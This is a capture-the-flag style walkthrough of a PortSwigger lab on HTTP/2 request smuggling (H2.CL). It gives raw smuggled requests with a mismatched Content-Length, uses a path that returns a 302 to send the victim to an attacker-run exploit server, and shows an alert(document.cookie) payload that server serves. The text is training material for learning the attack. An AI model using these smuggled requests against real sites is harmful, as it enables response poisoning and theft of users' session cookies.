# [H2.CL request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

> the goal is to make the victim to get a smuggled response that redirects (`302`) them to the exploit server

## recon

- try the following:

```
POST / HTTP/2
Host: xxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /qwe HTTP/1.1
X-Ignore: x
```

- even the frontend server HTTP/2 calculates the `Content-Length` it not correcting it in the request, what was sent to the backend
- at the backend the `Content-Length: 5` will read the the request till `...x=1\r\n`
- the rest is queued up for the next request where it will be appended on the top of that
- send that request then an original `/` request what should give back a `404`, what means it works
- might get a `200` because in the background the victim surfs the site and they might get the smuggled request's response

> the solution needs a redirect

- go to **Target** -> **History**
- pick the `GET /resources/js/analyticsFetcher.js` request
- try to send it as `GET /resources/js/` it will get a `404`
- but if you send it as `GET /resources/js` without the last `/` it will redirect (`302`) to `/resources/js/` what will give back a `404` but the redirect happened

## exploit

> setup the exploit server the following

- file:

```
/resources/js
```

- head:

```
HTTP/1.1 200 OK
Content-Type: text/javascript; charset=utf-8
```

- body:

```
alert(document.cookie);
```

> setup the request the following

- keep the `Content-Length` values
- the second host is the exploit server

```
POST / HTTP/2
Host: xxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources/js HTTP/1.1
Host: yyy.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```

- send it then an original `/` request
- might need to try a couple times
